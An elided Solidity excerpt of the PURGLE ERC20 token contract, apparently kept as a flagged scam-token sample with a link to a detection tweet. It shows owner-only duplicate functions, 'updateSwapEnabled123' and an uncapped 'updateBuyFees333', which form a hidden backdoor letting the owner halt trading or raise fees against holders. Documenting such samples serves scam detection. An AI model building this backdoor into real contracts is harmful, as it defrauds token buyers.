...
// https://twitter.com/DetectionWallet/status/1678211297215668224
...
contract PURGLE is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("PURGLE", "PURGLE") {
        ...
        marketingWallet = address(0x6f3dc68cce334273E03db28aCbe1C98b92F7bF1c); // set as marketing wallet
    ...
    function updateSwapEnabled(bool enabled) external onlyOwner(){
     ...
     function updateSwapEnabled123(bool enabled) external onlyOwner(){
        swapEnabled = enabled;
    }
    ...
    function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
     ...
     function updateBuyFees333(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
        buyMarketingFee = _marketingFee;
        buyLiquidityFee = _liquidityFee;
        buyDevFee = _devFee;
        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee;
